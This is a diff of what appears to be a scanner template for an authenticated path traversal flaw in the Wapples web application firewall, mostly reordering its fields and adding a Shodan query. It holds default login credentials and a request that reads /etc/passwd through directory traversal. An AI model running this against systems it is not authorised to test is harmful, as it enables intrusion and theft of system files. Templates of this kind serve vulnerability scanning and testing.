@@ -1,5 +1,4 @@
 id: wapples-firewall-lfi
-
 info:
   name: Wapples Web Application Firewall - Local File Inclusion
   author: For3stCo1d
@@ -14,13 +13,24 @@ info:
     cpe: cpe:2.3:a:pentasecurity:wapples:*:*:*:*:*:*:*:*
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag authenticated
-    verified: true
     max-request: 2
+    product: wapples
+    shodan-query: http.title:"Intelligent WAPPLES"
     vendor: pentasecurity
-  tags: wapples,firewall,lfi,authenticated,vuln
-
+    verified: true
+  tags: authenticated,firewall,lfi,vuln,wapples
 http:
-  - raw:
+  - attack: pitchfork
+    matchers:
+      - regex:
+          - root:[x*]:0:0
+        type: regex
+    payloads:
+      password:
+        - db/wp.no1
+      username:
+        - systemi
+    raw:
       - |
         POST /webapi/auth HTTP/1.1
         Host: {{Hostname}}
@@ -31,15 +41,3 @@ http:
         GET /webapi/file/transfer?name=/../../../../../../../../etc/passwd&type=db_backup HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
-
-    attack: pitchfork
-    payloads:
-      username:
-        - systemi
-      password:
-        - db/wp.no1
-    matchers:
-      - type: regex
-        regex:
-          - "root:[x*]:0:0"
-
